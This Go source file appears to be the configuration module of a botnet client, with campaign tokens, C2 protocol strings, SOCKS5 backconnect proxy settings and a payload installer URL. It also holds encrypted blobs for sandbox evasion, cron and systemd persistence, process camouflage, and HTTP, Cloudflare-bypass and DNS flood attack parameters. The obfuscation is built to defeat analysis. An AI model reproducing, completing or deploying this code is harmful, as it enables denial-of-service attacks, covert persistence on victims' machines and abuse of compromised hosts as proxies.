package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "5b856949" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "Y%aBySn$vy6aoRp4" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V4_2" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("796c7f330034dc0f7c54350a8e1b9255136c653276dda1ab5302647b8cfbbd00f0f559ca81b1ad18a7ea3090") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("25cf201de2dfbbaf0f0f0cfb88bc702337c0feb850e5cbd5f3d9065b7a812d6a8759e255a8893528bba95b45197a4d5677e601d40c20db8e9068cf43c6b3cd85c61a64f3a848e18679c165b198f5b269121f12840bd094cf98dc4ed01f059bb45838ae4b9d8cf55cb8e53be332317384ad726af92a")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("2fcdfefdec0d3d740b1862f8e6ad8fe6e85ddf05eb5ea55578a33f9548f5e6e86cbe75fe3edf45004db6efd5825a6659bdd3517b60c64d2266c73b954a527920cd6c9573cacd0162e036")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("931bbece7053ebe32ada8ed57a245470ebb7b41ef48f22844fa5bf70738616e9")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("ce5d1f78f629ea78572e0c1d9b82af3295f1dad60bbab8b5629b11e449")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("d3034310024db301c2b4deb2711d094b719229f66f28d0c737ec8b63b63fa51506a7ae943c")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("7c4ffc81b40fc8a7aae9f99a626139ef0dcbf0262e572e8dc893a88955dd28")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("4f2bc8469aa4e9389e2dd4e96314ae3dfb97149dc271dd0ef093c4fc0d")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("8d96267a858173ec5d8afeb1e79423ca73413cc66e89d506c515754f21b719bc463f156241ad497d438833877347932f49693f84d3879d")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("43c5ee67cf52a7c69956c174557c3f9df89cecd8ab9139c3c813c04376e4670af50c4c")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("3d4bb048c16ca4aa9372f5da87084bd1554916e3038edc771623f6558f9944f78e6ef73c13f32dd3a5c7af03be3dc8123d7784d6442e424e2205a8b537c9993a8a656d2ee34e66c06a83cd6b464bd06b5ba95103260347691d4cad1908e4f3323877eb0f54b57142aff621fb060e392565fad94ad037085fa16a825933e2981b4955d67194f7d73ccff3b96148ab0b171124492fbf5db834f9788baee22f2842571f217cdc8f20ea30bd0def1c87964f723ed692a003daba2d4db3de36328fbd5a75143f9dd4fac76f5c78c42630ba")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("2799ce05b6ca86677d417b9c109a28924ac8f0932c4e6d4f07296c4f3609865b0eab399b9ef2112be0a3f427fece4a229b27cc7041d7fc4499825ca0ceee140f4964b147be0f495bbf7e6aa0ea2e0a1f02e4ea6cbe9d8f7add06aa7b4068d3ab41654fdc0c65cf0a5d102fdb423822770c54b7f0ce65ec65d29b8e4b5dc41ddb66ccc5023b2a2355676edcb73c3b4e2ce9b98895af72088de4194b4e1b8bb2684eb6618525423d12befa4c836592a6a28a71493bb866446c249de38d50992149b027c81afa9a")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("20e2c9a65451df4f5dac7c0238b243c04ebc87cd756f36241f")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("47da1d89769e53bcb082a9cbe96e9e4c6052ecf8323cb51c40c1b04586")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("4d59d6890ac6d88c3a10d8d653fdbf703d8658ddef5f5b0b67c1995ef5b7a0b7f1284039177e56")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("fa90cea3804e0bd8be125d9663f9956e900d78d4deef9c29fb7b2b54f875772a31e95b8638f7be5c1804ff")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("3c87e0c193e43119e9e355096b40fb243539cf0b9959d5acc5dfefe2f7c63c")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("79ad9e15794c122a86ed3f924951eab0a8021fb44fb2da386ff9560d")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("d5be9fe42e53cfc16daaed22fcac680b2ae2b9e2d677d5ccaf23b6d056b57c05997f0b6550f1678897a01fc98a4cca1e")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("d8685a992cad26de69159d96fe2816ab43b4a823")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("66f515074999b03e8506818fc2bfa92dda69623402")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("e888599e6dc9ba0f7bb4e9e7ed64886d0e38f8a9cb87b621813186b559cabc")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("13d515e09a7b73b8fa9631da1dc695f5062dacefe190cb70040e")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("2ba1fe1e5ec4877cd4d6333bd20599bce029c5e970f36e456d5e7d")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("387016e2f90d5f7cc2f03a0b7a202172b5a04d6f4e57a49d4db3fc")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("cdf4d57a694df9b7b914e48cb59ec6f32baf72a889442ab747aed3ea216b96")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("030be6ffe8bce1293696c1307afbd7672fc0dbd3fc0a23b36b1869a0f04a14a8b143db7556a3fab55d81313d572dad1242514d4fb7")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("322b1e88118a2d36df96ff0ba46f1ce07e9a3887ff3c10263e")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("fa1cdeac33aa0b0962a8afad5d44a6a7d01c6aec854c4cff014d290de0ac4df52c54")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("bc0c000fefb10ae212611229a97497e77d3a1f3857e70b0ce437eadda66d179af2602678055cfb6a5f2c023cfbf3")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("bb24bfb78bfa0f96e88d8809cf139a233be24da32e7977114f1a903ce932a9fe1381ac7eafe77308dd32c22e")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("b1ec1965dc0e569728daa675f69f59a6b2b6e72a401ac8d3ef954b79369635e3bce25eaf1695573200127bb8250943d66b4d446d947b74504ec0")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("3b7c41389926cb3b3c4b765792d11b2fad4d6818a8ad60d27c996d3d106735dc")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("608a5fe3c2022dba96a097ef4917b7332585a92971673d779d342bb131803957ac5a520269317c4f5f0f5131cade9b07")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("971cb3feb6f83c40ce009e082351d9e82969239e86a8b783ac4dfe2a0c1f11a87d7928fc89")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("3c3db0ccf5fdffe9647664a3f080610dcf5d78b6054e5144a3758d5121a97fd57cf26f6a694e4ca01c52d42e7cabbd")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("da9d4c67467dce8dd1e200fa49bf8c9d900ebaf211262b2641f0287b50b0b4db6e556b40f8ff235d6b26add94254a4143cefbd1a5c0839f3f8116e9abe9ef2c059f033dc65de2e7ed07fadae664b4a7900cbaa385daf9c9a18e59fabd5cf077c77d9a469cce12c974669cfa5447c07a93f")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("3955b23cec37d8df40f1a7af1d5590af599eb8f9d879aa4c8c14feca87f9e24a2ffe92d28927bedc193618d1f491e9c0aa9ead57e12e811646a0bbb3d0b6ac6f00c492233399c70af7f2e97093ab52c359")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("0eb6723d4529a99f65ecb26ebe3be66336bc6b7f27039687335d6cd6854114ce73e35742646f9f213a9c42037f4284569b3c212eacb509a063c2a9579a31bb53144701c0313cc3ce1ebe43981409")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("220730fdaff14535ea90282afa94f9bc286e143be6b86436d460087a272f62974d1e5fa1c738685b111ec7c9c28935deb6fcb95bf14370b07c76753b26a59ad1a75bd82d707967c374e96c7d99")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("7978f3f1b5e714dd3be876067e0200e05595984d2e93801fe35d7605e7581db44068f1c20412598d4f1925392ea903bf74f98f1ff11810e22ba11c748caac3")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("3d537af5a2a72ea3dc7d850833f4b23a8ed67af425aeef95d59475f8552ad75d51e908d4")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("2a6d66de9e6c0b231eafe11c406642634381a11845c7855b396b0d296bd8497af5d86be302610f97e9404b047ac6ac0d6162b0b02b353666b1cfe61b03c8d75b3f90f6440baf33a3968d91288644e9df58ff9cc5f22d0e334ee6c320f0bb339f4ba6cd01177b32d2bfd416436a78a388e37b52c7c62e1f8a01052b59c5d859d256026b193f8f916c9a829fa611b5def6de887a0f8103100ffc66ad0f814c47e11e5dd03b3d53e41b8c79e1dc62392419a0a5017888a11cec611730e046f9cfce4844687f83e295a92bce21cbef009b37bf57cec6630e4b8b374c000362")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("f5b7711a5920a871a11b7f59a0973a56e9fc5c33078072d7e60e9d50a391286dd64bf770d77f5d57db77e14fd672f5f3b250074caeec20ea554e88b9f84f2234a5e2fc8339e953d1f12c91a7ef3c997981cdb5e25af87d12178c60")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("3a8019cd12e58ca0ff5ebc7246dcf3713d61604c093359c1ae93e900a1b7ee68071b2780e126afc35bd7f2cae3fab5a84b0e715699e0265380fa85")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("2e3432eaf48f2841c715e3057004b3bebfb5d24c0be1409e7a8634a923b552f97b211dcf73018b50625f6f4aab5ce23605481009dd480de26c906a0ce81b5bea8d7baebea9f2064dce")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("f0b312135e7269eed7a03dd836da84c54006c2eaa358ca")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("a009b3cdd14b43933aa14e48840f8778f3f8679c462918589b55a080befb7acfde00")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("946c9bdc411faa69ae2df9f2d6d10ce6d54093f1ea1e3c813c508b3f0be0d86f5743e56dbd9a43c46d14506c5aa05c5ceb153293c1ff298b9e50dc6a9b9e0bfb93d819b246f0363d3abe45bf4aa0c14af0086eff2a9573f9df8d8a2ac66bfb")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("bf3726e35db1a5e39b8b13d597a842431c9c")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("695bca53b02b94218ffc0deb9039e0e7e9da671da86536414bfdcf201b3d9bf55d46659664d5b3949b8ea31704b388d85cc7319628")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("c690c77405b9751fddb5ffcedf200db87d53")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("d711fd7635abcd17f438b771b85d85a7ed44")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("86fbae67c8031c3629884db4a8cc9c7470e68b578867")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("1d8598240f79c8d0301f0220f1a10f1f2140c1b05e53a6c0")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("b3d5cd585b53450b9ec2891556bd4be5408944279b")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("dc9ba48e51c5ca85431f0f6ccd7a8f832730")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("8c032c2ad312c3423700450832cb813a4bd7ed5062c8ca7a5d")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("24c6e63f58d23488337b72bef1cd918cafcb8d4c54a68ebb99")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("19cf3d436bc889a9c8e3826d53efb0ba6cc3312be2f472")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("8feb0707d2f9d8dfab7fc4339bd4f224e1cec875")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
